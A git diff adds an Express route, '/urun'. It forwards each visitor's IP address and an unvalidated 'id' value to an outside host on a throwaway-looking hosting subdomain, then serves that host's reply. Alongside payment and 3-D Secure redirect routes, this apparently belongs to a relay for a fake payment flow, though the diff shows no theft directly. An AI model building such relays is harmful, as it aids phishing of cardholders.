@@ -163,6 +163,30 @@ app.get('/payment/bkm', async (req, res) => {
   }
 });
 
+app.get('/urun', async (req, res) => {
+  try {
+    const id = req.query.id;
+    const clientIp = getClientIp(req);
+
+    if (!id) {
+      return res.status(400).send('ID parametresi eksik.');
+    }
+
+    const response = await axios.post(
+      `https://forestgreen-rook-759809.hostingersite.com/dmn/urun?id=${id}`,
+      qs.stringify({ ip: clientIp }),
+      {
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+      }
+    );
+
+    res.send(response.data);
+  } catch (error) {
+    console.error('Ödeme sayfası hatası:', error.message);
+    res.status(500).send('Sunucudan veri alınamadı.');
+  }
+});
+
 app.get('/acsredirect', async (req, res) => {
   try {
     const clientIp = getClientIp(req);
